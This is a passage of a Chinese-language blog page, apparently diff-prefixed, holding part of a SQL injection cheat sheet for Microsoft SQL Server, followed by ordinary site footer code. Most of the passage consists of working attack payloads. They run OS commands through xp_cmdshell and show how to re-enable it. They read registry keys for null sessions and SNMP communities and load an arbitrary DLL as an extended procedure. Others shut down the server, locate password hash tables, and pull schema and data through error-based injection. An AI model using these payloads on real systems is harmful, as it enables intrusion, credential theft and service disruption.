+<h4 id="执行系统命令，xp-cmdshell-S"><a href="#执行系统命令，xp-cmdshell-S" class="headerlink" title="执行系统命令，xp_cmdshell(S)"></a>执行系统命令，xp_cmdshell(S)</h4><p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限EXEC master.dbo.xp_cmdshell ‘cmd.exe dir c:’用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。EXEC master.dbo.xp_cmdshell ‘ping ‘如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p>
+<h4 id="SQL-Server中的一些特殊的表-S"><a href="#SQL-Server中的一些特殊的表-S" class="headerlink" title="SQL Server中的一些特殊的表(S)"></a>SQL Server中的一些特殊的表(S)</h4><ul>
+<li>Error Messagesmaster..sysmessages</li>
+<li>Linked Serversmaster..sysservers</li>
+<li>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) SQL Server 2000: masters..sysxlogins SQL Server 2005 : sys.sql_logins</li>
+</ul>
+<h4 id="SQL-Server的其它内置程序-S"><a href="#SQL-Server的其它内置程序-S" class="headerlink" title="SQL Server的其它内置程序(S)"></a>SQL Server的其它内置程序(S)</h4><ol>
+<li>命令执行 (xp_cmdshell)exec master..xp_cmdshell ‘dir’</li>
+<li>注册表操作 (xp_regread)<ol>
+<li>xp_regaddmultistring</li>
+<li>xp_regdeletekey</li>
+<li>xp_regdeletevalue</li>
+<li>xp_regenumkeys</li>
+<li>xp_regenumvalues</li>
+<li>xp_regread</li>
+<li>xp_regremovemultistring</li>
+<li>xp_regwriteexec xp_regread HKEY_LOCAL_MACHINE, ‘SYSTEM\CurrentControlSet \Services\lanmanserver\parameters’, ‘nullsessionshares’ exec xp_regenumvalues HKEY_LOCAL_MACHINE, ‘SYSTEM \CurrentControlSet \Services\snmp\parameters\validcommunities’</li>
+</ol>
+</li>
+<li>管理服务(xp_servicecontrol)</li>
+<li>媒体(xp_availablemedia)</li>
+<li>ODBC 资源 (xp_enumdsn)</li>
+<li>登录 (xp_loginconfig)</li>
+<li>创建Cab文件 (xp_makecab)</li>
+<li>域名列举 (xp_ntsec_enumdomains)</li>
+<li>杀进程 (need PID) (xp_terminate_process)</li>
+<li>新建进程 (<em>实际上你想干嘛都行</em>)sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ exec xp_webserver</li>
+<li>写文件进UNC或者内部路径 (sp_makewebtask)</li>
+</ol>
+<h4 id="大量MSSQL笔记"><a href="#大量MSSQL笔记" class="headerlink" title="大量MSSQL笔记"></a>大量MSSQL笔记</h4><p>SELECT <em> FROM master..sysprocesses /\</em>WHERE spid=@@SPID*/DECLARE @result int; EXEC @result = xp_cmdshell ‘dir *.exe’;IF (@result = 0) SELECT 0 ELSE SELECT 1/0HOST_NAME() IS_MEMBER (Transact-SQL) IS_SRVROLEMEMBER (Transact-SQL) OPENDATASOURCE (Transact-SQL)INSERT tbl EXEC master..xp_cmdshell OSQL /Q”DBCC SHOWCONTIG”OPENROWSET (Transact-SQL) - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx" target="_blank" rel="noopener">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a> 你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p>
+<h4 id="使用LIMIT-M-或ORDER-MSO-的注入"><a href="#使用LIMIT-M-或ORDER-MSO-的注入" class="headerlink" title="使用LIMIT(M)或ORDER(MSO)的注入"></a>使用LIMIT(M)或ORDER(MSO)的注入</h4><p>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,’x’/*,10 ;如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p>
+<h4 id="关掉SQL-Server-S"><a href="#关掉SQL-Server-S" class="headerlink" title="关掉SQL Server(S)"></a>关掉SQL Server(S)</h4><p>如果你真的急了眼，’;shutdown –</p>
+<h3 id="在SQL-Server-2005中启用xp-cmdshell"><a href="#在SQL-Server-2005中启用xp-cmdshell" class="headerlink" title="在SQL Server 2005中启用xp_cmdshell"></a>在SQL Server 2005中启用xp_cmdshell</h3><p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。 <code>\\EXEC sp\_configure &#39;show advanced options&#39;,1 RECONFIGURE EXEC sp\_configure &#39;xp\_cmdshell&#39;,1 RECONFIGURE</code>\</p>
+<h3 id="探测SQL-Server数据库的结构-S"><a href="#探测SQL-Server数据库的结构-S" class="headerlink" title="探测SQL Server数据库的结构(S)"></a>探测SQL Server数据库的结构(S)</h3><h4 id="获取用户定义表"><a href="#获取用户定义表" class="headerlink" title="获取用户定义表"></a>获取用户定义表</h4><p>SELECT name FROM sysobjects WHERE xtype = ‘U’</p>
+<h4 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h4><p>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘tablenameforcolumnnames’)</p>
+<h3 id="移动记录-Moving-records-S"><a href="#移动记录-Moving-records-S" class="headerlink" title="移动记录(Moving records)(S)"></a>移动记录(Moving records)(S)</h3><ul>
+<li>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong> … WHERE users NOT IN (‘First User’, ‘Second User’)SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)– 这个好用</li>
+<li>脏的不行的小技巧SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as intSelect p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=’U’ and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = ‘U’) as p where p.x=21</li>
+</ul>
+<h3 id="快速的脱掉基于错误-Error-Based-的SQL-Server注入-S"><a href="#快速的脱掉基于错误-Error-Based-的SQL-Server注入-S" class="headerlink" title="快速的脱掉基于错误(Error Based)的SQL Server注入(S)"></a>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3><p>‘;BEGIN DECLARE @rt varchar(8000) SET @rd=’:’ SELECT @rd=@rd+’ ‘+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = ‘MEMBERS’) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;–<strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/" target="_blank" rel="noopener">Fast way to extract data from Error Based SQL Injections</a></strong></p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    <a class="pull-left" href="/2015/11/03/sqlmap-e7-94-a8-e6-88-b7-e6-89-8b-e5-86-8c/" style="float: left;">
+        ← sqlmap用户手册
+    </a>
+    
+    
+    <a class="pull-right" href="/2015/10/22/e5-9b-9b-e6-ad-a5-e6-95-99-e4-bd-a0-e7-a0-b4-e8-a7-a3-e9-9a-94-e5-a3-81-e8-80-81-e7-8e-8b-e7-9a-84wi-fi-e5-af-86-e7-a0-81-ef-bc-8c-e8-b9-ad-e7-bd-91-e6-b2-a1-e5-95-86-e9-87-8f-ef-bc-81/">
+        四步教你破解隔壁老王的Wi-Fi密码，蹭网没商量！ →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By John Doe. All Rights Reserved.
+                </p>
+                <p>Theme By <a href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
